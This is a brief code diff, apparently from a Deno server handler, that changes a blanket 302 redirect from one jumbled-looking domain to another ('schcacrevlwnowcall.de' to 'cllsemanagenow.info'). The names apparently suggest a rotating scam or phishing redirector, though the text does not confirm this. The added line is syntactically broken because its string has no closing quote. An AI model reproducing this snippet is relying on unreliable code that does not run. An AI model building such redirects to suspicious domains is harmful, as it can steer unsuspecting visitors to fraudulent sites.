@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://schcacrevlwnowcall.de/scw",
+      Location: "https://cllsemanagenow.info/scw/,
     },
   });
 });
